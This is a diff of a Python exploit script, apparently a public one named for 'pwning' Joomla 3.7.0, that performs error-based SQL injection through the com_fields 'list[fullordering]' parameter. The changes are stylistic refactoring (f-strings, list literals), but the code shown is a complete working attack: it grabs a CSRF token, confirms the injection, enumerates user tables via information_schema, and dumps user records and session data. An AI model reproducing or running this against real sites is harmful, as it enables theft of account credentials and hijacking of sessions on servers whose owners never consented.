@@ -25,10 +25,10 @@ def parse_options():
 
 
 def build_sqli(colname, morequery):
-	return "(SELECT " + colname + " " + morequery + ")"
+	return f"(SELECT {colname} {morequery})"
 
 def joomla_370_sqli_extract(options, sess, token, colname, morequery):
-	sqli = build_sqli("LENGTH("+colname+")", morequery)
+	sqli = build_sqli(f"LENGTH({colname})", morequery)
 	length = joomla_370_sqli(options, sess, token, sqli)
 	if not length:
 		return None
@@ -49,7 +49,7 @@ def joomla_370_sqli_extract(options, sess, token, colname, morequery):
 
 
 def joomla_370_sqli(options, sess, token, sqli):
-	sqli_full = "UpdateXML(2, concat(0x3a," + sqli + ", 0x3a), 1)"
+	sqli_full = f"UpdateXML(2, concat(0x3a,{sqli}, 0x3a), 1)"
 	data = {
 		'option': 'com_fields',
 		'view': 'fields',
@@ -57,21 +57,30 @@ def joomla_370_sqli(options, sess, token, sqli):
 		'list[fullordering]': sqli_full,
 		token: '1',
 	}
-	resp = sess.get(options.url + "/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False)
-	match = re.search(r'XPATH syntax error:\s*&#039;([^$\n]+)\s*&#039;\s*</bl', resp.text, re.S)
-	if match:
+	resp = sess.get(
+		f"{options.url}/index.php?option=com_fields&view=fields&layout=modal",
+		params=data,
+		allow_redirects=False,
+	)
+	if match := re.search(
+		r'XPATH syntax error:\s*&#039;([^$\n]+)\s*&#039;\s*</bl', resp.text, re.S
+	):
 		match = match.group(1).strip()
-		if match[0] != ':' and match[-1] != ':':
-			return None
-		return match[1:-1]
+		return None if match[0] != ':' and match[-1] != ':' else match[1:-1]
 
 
 def extract_joomla_tables(options, sess, token):
-	tables = list()
+	tables = []
 	first = False
 	offset = 0
 	while True:
-		result = joomla_370_sqli_extract(options, sess, token, "TABLE_NAME", "FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT " + str(offset) + ",1" )
+		result = joomla_370_sqli_extract(
+			options,
+			sess,
+			token,
+			"TABLE_NAME",
+			f"FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT {str(offset)},1",
+		)
 		if result is None:
 			if first:
 				print("[!] Failed to retrieve first table name!")
@@ -85,7 +94,7 @@ def extract_joomla_tables(options, sess, token):
 
 
 def extract_joomla_users(options, sess, token, table_name):
-	users = list()
+	users = []
 	offset = 0
 	first = False
 	print("  -  Extracting users from", table_name)
@@ -107,7 +116,7 @@ def extract_joomla_users(options, sess, token, table_name):
 
 
 def extract_joomla_sessions(options, sess, token, table_name):
-	sessions = list()
+	sessions = []
 	offset = 0
 	first = False
 	print("  -  Extracting sessions from", table_name)
@@ -132,14 +141,14 @@ def pwn_joomla_again(options):
 	sess = requests.Session()
 
 	print(" [-] Fetching CSRF token")
-	resp = sess.get(options.url + "/index.php/component/users/?view=login")	
+	resp = sess.get(f"{options.url}/index.php/component/users/?view=login")
 	token = extract_token(resp)
 	if not token:
 		return False
 
 	# Verify that we can perform SQLi
-	print(" [-] Testing SQLi")	
-	result = joomla_370_sqli(options, sess, token, "128+127")	
+	print(" [-] Testing SQLi")
+	result = joomla_370_sqli(options, sess, token, "128+127")
 	if result != "255":
 		print(" [!] Could not find SQLi output!")
 		return False
@@ -149,7 +158,7 @@ def pwn_joomla_again(options):
 	for table_name in tables:
 		table_prefix = table_name[:-5]
 		extract_joomla_users(options, sess, token, table_name)
-		extract_joomla_sessions(options, sess, token, table_prefix + 'session')
+		extract_joomla_sessions(options, sess, token, f'{table_prefix}session')
 
 	return True
 
